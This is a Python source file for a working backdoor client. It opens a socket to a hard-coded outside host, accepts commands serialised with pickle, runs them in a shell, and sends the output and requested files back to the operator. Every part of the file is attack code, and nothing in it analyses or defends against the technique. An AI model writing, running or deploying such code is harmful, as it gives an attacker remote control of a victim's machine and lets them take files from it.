from asyncio import constants
import socket
import subprocess
from unittest import result
import json
import os
import base64
import pickle

# json.dump is used to convert (normal--->json object)
# json.loads is used to convert (json object ---> normal)

host_ip = "games-nursery.at.ply.gg"
host_port = 21707

class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            self.connection.connect((host_ip,host_port))
        except socket.gaierror:
            print('[-]  Internet connection error.')
            exit()

    def execute_system_command(self,command):
        cmd = command
        # print(cmd)
        try:
            res = subprocess.check_output(cmd,shell=True).decode()
        except subprocess.CalledProcessError:
            res = f'\'{command[0]}\' is not recognised as an internal or external command'
        return str(res)

    def change_dir(self,path):
        os.chdir(path)
        return "[+] Changing working directory to "+path

    def rel_recv(self):
        pickle_data = b''
        while True:
            try:
                recv_data = self.connection.recv(1024)
                if(type(recv_data)!=bytes): recv_data=recv_data.decode()
                pickle_data=pickle_data+recv_data
                return pickle.loads(pickle_data)
            except:
                continue


    def rel_send(self,data):
        print('Rel_send says: Type of data = '+str(type(data)))
        pickle_data = pickle.dumps(data)
        if(type(pickle_data)!=bytes):
            self.connection.send(pickle_data.encode())
        else:
            self.connection.send(pickle_data)

    def read_file(self,path):
        with open(path,'rb') as file:
            return file.read()

    def run(self):
        while True:
            command = self.rel_recv()
            # print(command)

            # if command[0] == 'flag':
            #     if command[1] == 'started':
            #         print("[+] Connected to host.\n")
            #         result = 'Connection received.'

            if command[0]=='exit':
                print('[-] Exit request from host')
                self.connection.close()
                exit()

            elif command[0]=='cd' and len(command)>1:
                result = self.change_dir(command[1])

            elif command[0] == 'download':
                result = self.read_file(command[1])

            else:
                result = self.execute_system_command(command)

            self.rel_send(result)


backdoor = Backdoor(host_ip,host_port)
backdoor.run()